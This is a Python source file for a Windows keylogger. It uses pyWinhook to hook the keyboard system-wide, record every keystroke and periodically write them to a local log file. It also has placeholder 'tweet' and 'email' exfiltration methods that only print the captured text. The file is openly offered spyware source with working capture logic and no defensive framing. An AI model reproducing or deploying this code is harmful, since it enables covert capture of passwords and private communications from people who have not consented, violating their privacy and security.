import time
from threading import Thread

import pythoncom
import pyWinhook as pyHook


class KeyLogger:

    def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
        self.key_strokes = ""
        self.log_file = None
        self.time_interval = time_interval * 60
        if log_method == 1:
            self.log_method = self.log_to_file
            self.log_file = open(log_file,'w')
        elif log_method == 2:
            self.log_method = self.tweet_log
        elif log_method == 3:
            self.log_method = self.email_log

    def schedule_log(self):
        while True:
            time.sleep(self.time_interval)
            self.log_method()

    def ListenKeyboard(self,event):
        if event.Key == 'Escape':
            print("Writing logs and quitting...")
            self.log_method()
            exit(0)
        if event.Ascii in range(32,127):
            if event.MessageName == 'key down':
                self.key_strokes += chr(event.Ascii)
        else:
            if event.MessageName == 'key down':
                self.key_strokes += f' [{event.Key}] '

        return True

    def run(self):
 
        hm = pyHook.HookManager()
        hm.KeyAll = self.ListenKeyboard
        hm.HookKeyboard()

        t = Thread(target=self.schedule_log,args=())
        t.daemon = True
        t.start()

        print("Keylogger started.") # logging
        pythoncom.PumpMessages()

    def log_to_file(self):
        self.log_file.write(self.key_strokes)
        self.log_file.flush()
        self.key_strokes = ""

    def tweet_log(self):
        print("Tweeting keylogs: ",self.key_strokes)
        self.key_strokes = ""

    def email_log(self):
        print("Sending email logs: ",self.key_strokes)
        self.key_strokes = ""

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.run()